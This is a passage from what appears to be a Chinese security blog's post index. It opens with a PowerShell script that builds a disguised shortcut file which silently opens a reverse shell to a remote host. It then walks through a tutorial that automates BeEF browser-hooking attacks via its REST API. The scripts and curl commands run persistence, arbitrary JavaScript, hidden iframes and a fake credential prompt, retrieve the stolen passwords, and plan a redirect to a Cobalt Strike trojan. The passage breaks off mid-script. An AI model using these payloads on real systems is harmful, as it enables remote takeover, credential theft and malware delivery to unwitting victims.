variable">$WshShell</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>comObject WScript<span class="token punctuation">.</span>Shell<span class="token variable">$Shortcut</span> = <span class="token variable">$WshShell</span><span class="token punctuation">.</span>CreateShortcut<span class="token punctuation">(</span><span class="token string">"c:\lnk_tests\payload.lnk"</span><span class="token punctuation">)</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>TargetPath = <span class="token string">"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>IconLocation = <span class="token string">"%SystemRoot%\System32\Shell32.dll,21"</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>Arguments = <span class="token string">'-windowstyle hidden /c $client = New-Object System.Net.Sockets.TCPClient("""192.168.1.10""",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2  = $sendback + """PS """ + (pwd).Path + """> """;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>Save<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 攻防渗透 </category>
          
          <category> 程序代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用BeEF REST API自动化控制僵尸主机</title>
      <link href="/2017/06/25/li-yong-beef-rest-api-zi-dong-hua-kong-zhi-jiang-shi-zhu-ji/"/>
      <url>/2017/06/25/li-yong-beef-rest-api-zi-dong-hua-kong-zhi-jiang-shi-zhu-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="利用BeEF-REST-API自动化控制僵尸主机"><a href="#利用BeEF-REST-API自动化控制僵尸主机" class="headerlink" title="利用BeEF REST API自动化控制僵尸主机"></a>利用BeEF REST API自动化控制僵尸主机</h1><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004610321-454563044.png" alt="img"></p><h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h1><p> 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它的API，顺便练习一下python编程，这里把自己的学习内容分享下。本文涉及的一些内容可能具有一定的攻击性，请遵守国家法律，禁止用于非法用途。</p><h1 id="二-通过API控制beef"><a href="#二-通过API控制beef" class="headerlink" title="二. 通过API控制beef"></a>二. 通过API控制beef</h1><p>　　BeEF从0.4.3.3,版本开始，提供了静态API接口，用户可以通过发送HTTP / JSON请求控制Beef。</p><p>　　我们可以通过程序，批量自动加载执行某些beef的模块，实现比如自动维持权限，Getshell等功能。</p><p>　　在后面的正文里，每一个调用模块的示例中，我都会尝试单独编写代码进行测试，最后，我会将各个部分组合起来，实现一个自动化控制的小demo。本文涉及到的所有代码你都可以在这里找到：<a href="https://github.com/ssooking/AutoBeef/" target="_blank" rel="noopener">https://github.com/ssooking/AutoBeef/</a>。进入正题，我们先启动beef。本机IP：192.168.1.133</p><pre><code>默认hook js：http://192.168.1.133:3000/hook.js默认hook页面： http://192.168.1.133:3000/demos/basic.html默认管理界面：  http://192.168.1.133:3000/ui/panel</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607220012715-1405193293.png" alt="img"></p><p>　　当我们启动beef的时候，会自动生成一个静态API key，这个key用于身份认证，我们每次通过API进行控制时，都要添加这个参数值 。需要提到的是，如果你发现后文的API key，session等参数值发生了变化，是因为这篇文章不是一次写完的，测试时因为重新开启beef产生了变化，因此不要纠结，我们应该关注API如何调用。</p><p>下面，我们可以创建一个简单的hook页面 ，如xss.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>　　　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.1.133:3000/hook.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>　　我们也可以访问默认hook页面<code>http://192.168.1.133:3000/demos/basic.html</code>，为了测试，这里我使用了一台虚拟机，本机也使一个浏览器被hook。在管理面板可以看到主机已经上线。</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607224354918-1154401251.png" alt="img"></p><p>　　在控制台，我们能够直接看到被hook的主机，并执行相关攻击模块。那么怎样通过API实现这些功能呢？下面，我们将通过实例进行介绍。在此之前，我们需要知道的是，用于处理我们的API请求的文件，主要存放于beef框架下core目录和core/api目录下，我们可以在该目录下查找并阅读相关源代码，了解功能的实现机制，使用API进行HTTP交互时，默认的交互数据类型为json。</p><h2 id="获取API-Key"><a href="#获取API-Key" class="headerlink" title="获取API Key"></a>获取API Key</h2><p>/api/admin/login是用户登录接口，通过该接口登录之后，我们可以得到用于会话认证的API key</p><p>我们用curl命令，使用默认的口令提交登录请求，会返回我们的key。这个功能可以被用于后文编写自动化控制脚本。</p><pre class=" language-bash"><code class="language-bash">curl -H <span class="token string">"Content-Type: application/json"</span> -X POST -d <span class="token string">'{"username":"beef", "password":"beef"}'</span> http://192.168.1.133:3000/api/admin/login</code></pre><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607221323325-1242387563.png" alt="img"></p><p>我们可以用下面这样一个简单的小脚本实现，代码也比较简单，不再多废话</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">getauthkey</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    apiurl <span class="token operator">=</span>  host <span class="token operator">+</span> <span class="token string">"api/admin/login"</span>    logindata <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"beef"</span><span class="token punctuation">,</span>         <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"beef"</span>    <span class="token punctuation">}</span>    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>logindata<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 对数据进行JSON格式化编码</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 生成页面请求的完整数据</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 发送页面请求</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获取服务器返回的页面信息，数据类型为str</span>    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 把数据解析成python对象，此时返回dict数据      </span>    <span class="token keyword">return</span> jsondata<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    <span class="token keyword">print</span> getauthkey<span class="token punctuation">(</span>host<span class="token punctuation">)</span></code></pre><h2 id="获取hook主机列表"><a href="#获取hook主机列表" class="headerlink" title="获取hook主机列表"></a>获取hook主机列表</h2><p>API中，我们要获取hook主机信息的api接口为：api/hooks。提交请求的格式类似于这样： api/hooks?token=xxxxx。需要的参数token的值是用于身份认证的API key。我们用curl命令发送请求，获取hook主机列表信息。</p><pre class=" language-bash"><code class="language-bash">curl http://192.168.1.133:3000/api/hooks?token<span class="token operator">=</span>641640ae3ce89c4da45ee98de341f3e858f62bd3</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607225240137-118168632.png" alt="img"></p><p>返回了当前hook的主机情况，返回的json数据格式不太友好，作为测试，我们可以使用json代码格式化工具便于查看。</p><p>这里是一个不错的在线json编辑工具：<a href="http://tool.lu/json/" target="_blank" rel="noopener">http://tool.lu/json/</a>。我们也可以直接在浏览器中访问url，但是后文涉及提交某些必要的参数时，不能使用这种方式。</p><p>json代码经过格式化之后，我们可以看到，有两个主机上线。每个上线主机都有id号来表示身份。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607232844543-319859011.png" alt="img"></p><p><strong>session参数值是后面通过A{I调用执行beef模块时必须的参数，这个值你也可以在Web控制台的Cookie处找到。</strong></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170612091121353-718229824.png" alt="img"></p><p>我们也可以通过脚本发送类似的请求实现这个获取这些信息，比如下面这个简单的示例代码</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">getHookedBrowsers</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/api/hooks?token="</span> <span class="token operator">+</span> authkey<span class="token punctuation">)</span>    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hooked <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"hooked-browsers"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"online"</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> hooked    <span class="token keyword">return</span> hooked<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    key <span class="token operator">=</span> <span class="token string">"e7170da7263c46d8e505ab044017707107a2ee6f"</span>    getHookedBrowsers<span class="token punctuation">(</span>host<span class="token punctuation">,</span>key<span class="token punctuation">)</span></code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608164630215-992078805.png" alt="img"></p><p><strong>如果你想知道某个被hook主机的详细信息，只要加上浏览器session值即可，它的请求格式应该是这样的</strong></p><pre class=" language-bash"><code class="language-bash">/api/hooks/浏览器session会话值?token<span class="token operator">=</span>xxxxxxxxxxxxxxx</code></pre><p>再来说说怎样调用模块，这部分功能是由/api/modules.rb控制的</p><h2 id="列举可调用的模块信息"><a href="#列举可调用的模块信息" class="headerlink" title="列举可调用的模块信息"></a>列举可调用的模块信息</h2><p>我们通过/api/modules接口列举出可以调用的模块</p><pre class=" language-bash"><code class="language-bash">curl http://192.168.1.133:3000/api/modules?token<span class="token operator">=</span>641640ae3ce89c4da45ee98de341f3e858f62bd3</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233317356-1198715028.png" alt="img"></p><p>返回的格式不友好，我们直接在浏览器里访问</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233504997-672456143.png" alt="img"></p><p>我们可以发现，每一个模块都有对应的id号。我们在beef控制台里随便找一个，也可以找到这个id。但是需要注意一下，这个id号会因为你BeEF模块数目的不同有所变化，在编写代码之前你应该确认这个id号。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607233738497-1272039407.png" alt="img"></p><p> 　  <strong>如果你请求的格式像这样： /api/modules/130?token=xxxxx ， 即modules后面加上了具体的模块id号，那么可以得到这个模块的详细信息，比如需要的参数等</strong></p><p>　　所以，如果想要调用某个模块，我们只需要知道这个模块的id，并且在发送请求的的时候提供该模块需要的参数即可。</p><p>　　执行模块时请求的格式是这样的　/api/modules/:session/:module_id （session是被hook的浏览器会话，module_id即为beef模块的id号）</p><p>　　需要注意的是，提交参数时，Content-Type必须为json类型,字符集为 UTF-8，并且请求的主体内容必须是有效的json数据，这在后文有实例。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608101313481-884146508.png" alt="img"></p><h2 id="执行BeEF模块"><a href="#执行BeEF模块" class="headerlink" title="执行BeEF模块"></a>执行BeEF模块</h2><p>　　举个调用例子。</p><p>　　这里使用一个简单的权限维持模块 Confirm Close Tab。这个模块的作用是，受害者在试图关闭选项卡时会向用户显示”关闭确认”对话框，通过这种方式来增加shell的存活时间。相关功能的模块还有 Man-In-The-Browser，Create Foreground iFrame，Create Pop Under。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608100439372-44091558.png" alt="img"></p><p>我们可以看到，这个模块id为177，不需要提供其他参数，那么我们可以用curl模拟这种格式的请求来执行该模块</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{}'</span> http://xxxxx/api/modules/浏览器session/模块id?token<span class="token operator">=</span>xxxx</code></pre><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617130113978-1457039164.png" alt="img"></p><p>虽然模块不需要额外的参数，但是因为请求主体必须为json格式，所以我们用 -d ‘{}’ 发送空数据。此时beef终端会有执行成功的提示。</p><p>如果你没有这个参数，就会报如图中 Invalid JSON input for module ‘177’  的错误</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608155910356-911539469.png" alt="img"></p><p> 在浏览器中验证，当我们点击关闭这个页面时，会弹出确认框，说明成功加载了这个模块。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608155659825-677187987.png" alt="img"></p><p>同样的，我们可以编写脚本执行该模块</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">sendConfirm</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    postdata <span class="token operator">=</span> <span class="token string">'{}'</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/177?token="</span> <span class="token operator">+</span> authkey    <span class="token keyword">print</span> <span class="token string">"[+] URL: "</span> <span class="token operator">+</span> url    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    sessionId <span class="token operator">=</span> <span class="token string">"tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU"</span>    key <span class="token operator">=</span> <span class="token string">"e7170da7263c46d8e505ab044017707107a2ee6f"</span>    sendConfirm<span class="token punctuation">(</span>host<span class="token punctuation">,</span>sessionId<span class="token punctuation">,</span>key<span class="token punctuation">)</span></code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608165716747-1697948714.png" alt="img"></p><p> 来一个带参数的例子，这次我使用的是Raw JavaScript模块，这个模块允许我们在目标浏览器上执行javascript代码。注意，这些javascript代码不能经过特殊编码。</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609150451340-776876082.png" alt="img"></p><p>这个模块的id号为169，我们再来看看它需要的参数，通过下面这样的请求获取模块详细信息</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609151117465-1686660775.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155020790-1640674329.png" alt="img"></p><p>需要提供的参数名为：”cmd”，参数内容是我们要执行的Javascript代码，我们可以用curl构造请求进行测试</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"cmd":"alert(\ssooking\);"}'</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/169?token<span class="token operator">=</span>dadd1be063d3a3b4339d84f5bdbbcbb25616b41d36a3b062697706d9f2d5</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155422743-2018025793.png" alt="img"></p><p>因为不能用多个单引号，所以我用alert(/ssooking/)代替，但是没有弹出窗口，不过我使用自己编写的脚本执行这个模块就可以成功执行</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding=utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">execJavascript</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"alert('Hello ssooking!');"</span>    <span class="token punctuation">}</span>    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/169?token="</span> <span class="token operator">+</span> authkey    <span class="token keyword">print</span> <span class="token string">"[+] URL: "</span> <span class="token operator">+</span> apiurl    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>     req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>      resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                     <span class="token keyword">return</span> resdata<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    sessionId <span class="token operator">=</span> <span class="token string">"ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso"</span>    key <span class="token operator">=</span> <span class="token string">"dadd1be063d3a3b4339d84f5bdbbcbb25616b41d"</span>    <span class="token keyword">print</span> execJavascript<span class="token punctuation">(</span>host<span class="token punctuation">,</span>sessionId<span class="token punctuation">,</span>key<span class="token punctuation">)</span></code></pre><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155834290-1948404420.png" alt="img"></p><p>弹出了窗口</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615155804853-1359816839.png" alt="img"></p><p>再举个带参数的例子，这次我使用的是Create Invisible Iframe模块，它的功能是创建一个隐藏的Frame。</p><p>这个模块的id为174，需要的参数是隐藏的Frame所指向的url地址</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608190416903-771897904.png" alt="img"></p><p>先查看一下模块的详细参数</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608191702309-1914275279.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615153958915-885891081.png" alt="img"></p><p>可以看到，这个请求的这个url参数名为”target”。下面进行测试，我们使用python创建一个简单的HTTP服务器</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608192353684-2054230154.png" alt="img"></p><p>我们用curl构造请求</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"target":"http://192.168.1.133:8000/"}'</span> http://192.168.1.133:3000/api/modules/tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU/174?token<span class="token operator">=</span>32c75b5e91ef4e519da119349d2c0cbd7cd23259</code></pre><p>执行成功，python HTTP上成功回显，说明我们在目标的浏览器上创建了一个隐藏的iframe，并使其访问了这个url地址</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608223339903-90503676.png" alt="img"></p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615154145259-431225205.png" alt="img"></p><h2 id="获取模块执行结果"><a href="#获取模块执行结果" class="headerlink" title="获取模块执行结果"></a>获取模块执行结果</h2><p>有些模块执行完毕后，我们需要获取返回的数据，比如凭证欺骗模块Pretty Theft，我们想要获取用户输入的认证口令。</p><p>我们使用一个简单的windows凭证认证模板</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609162357934-1487342041.png" alt="img"></p><p>这时候目标浏览器上会弹出认证框</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609161931012-1900384378.png" alt="img"></p><p>模拟提交了凭证之后，从beef的执行结果中，我们可以看到欺骗到的密码</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170609162133403-1950800768.png" alt="img"></p><p>下面就通过API调用执行该模块，先看下参数</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160147759-668975630.png" alt="img"></p><p>查看模块详细信息，我们可以知道，需要设置的参数有：欺骗对话框类型”choice”，背景风格”backing”，Logo的图片地址”imgsauce” ，因此请求示例应该像这样：</p><pre class=" language-bash"><code class="language-bash">curl -i -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"choice":"Windows","backing":"Grey","imgsauce":"http://0.0.0.0:3000/ui/media/images/beef.png"}'</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/117?token<span class="token operator">=</span>dadd1be063d3a3b4339d84f5bdbbcbb25616b41d</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160851853-202353993.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615160749431-930877960.png" alt="img"></p><p>　　</p><p>执行成功，并且返回了模块执行的id为35。假设我们提交的口令是：test333/123456</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170614001556040-491212835.png" alt="img"></p><p>我们想要获取受害者提供的这些认证信息，这时候，我们需要这样请求：</p><pre class=" language-bash"><code class="language-bash">/api/modules/浏览器session/模块id/command_id？token<span class="token operator">=</span>xxx</code></pre><p> 比如</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615161100837-1887025062.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615161120290-855046422.png" alt="img">  </p><h2 id="Beef与metasploit联用"><a href="#Beef与metasploit联用" class="headerlink" title="Beef与metasploit联用"></a>Beef与metasploit联用</h2><p>　　我们当然不能忘记了metasploit这个神器。Beef与metasploit联用，实在是个大杀器。要想在beef加载metasploit，我们首先需要修改默认的配置文件，修改beef下<code>config.yaml</code>文件</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608170549684-1233972575.png" alt="img"></p><p>把启用<code>metasploit</code>这个选项值改成<code>true</code></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608170832622-145925591.png" alt="img"></p><p>另外,如果你的metasploit安装位置不包含在默认路径里，需要在<code>beef-xss/extensions/metasploit/config.yaml</code>的文件里设置一下</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608171240090-406564106.png" alt="img"></p><p>然后我们启动msf加载<code>msgrpc</code></p><pre class=" language-bash"><code class="language-bash">msfconsole -x <span class="token string">"load msgrpc ServerHost=127.0.0.1 Pass=abc123"</span></code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608171842528-1564566798.png" alt="img"></p><p>重启beef即可加载metasploit模块</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608172313700-431421692.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170608172818497-792530133.png" alt="img"></p><p>　　同样的，如果你想调用Metasploit模块，步骤与前面的都一样，先查看改模块的id所需参数等信息，然后构造请求调用这个模块即可，关于metasploit模块调用，因为过两天就要考试了，没有时间做测试，有兴趣的朋友可以试一试。这个是 BeEF-RESTful-API的上一个请求示例。</p><pre class=" language-bash"><code class="language-bash">curl -H <span class="token string">"Content-Type: application/json; charset=UTF-8"</span> -d <span class="token string">'{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}'</span> -X POST http://xxxx/api/modules/浏览器session?token<span class="token operator">=</span>xxx</code></pre><h1 id="三-编写自动化控制脚本"><a href="#三-编写自动化控制脚本" class="headerlink" title="三. 编写自动化控制脚本"></a>三. 编写自动化控制脚本</h1><p>　　下面我尝试编写一个简单的自动控制hook主机的脚本，批量执行我提前设定的一些模块。我的思路是定时获取hook主机的session信息 ，存放到一个字典里，如果有新上线的僵尸主机的浏览器session，我们就通过API控制这个浏览器执行我们设定好的Beef模块，并把这个session添加到一个列表里，表示已经执行过。如果检测到某个session已经存在于列表中，说明已经执行过，就不再执行。测试的代码中，我用到了三个模块：Confirm Close Tab，Raw Javascript，Redirect Browser。第一个模块用于增加shell存活时间，第二个模块用于执行javascript代码，第三个模块使浏览器进行跳转下载，我把这个跳转地址指向一个Cobalt Strike生成的测试木马，并模拟受害者自动下载并运行恶意软件。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token comment" spellcheck="true"># ** Name： AutoBeef.py</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">import</span> timehostlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>hostdict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">getauthkey</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    apiurl <span class="token operator">=</span>  host <span class="token operator">+</span> <span class="token string">"api/admin/login"</span>    logindata <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"beef"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"beef"</span>    <span class="token punctuation">}</span>    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>logindata<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 对数据进行JSON格式化编码</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 生成页面请求的完整数据</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 发送页面请求</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span 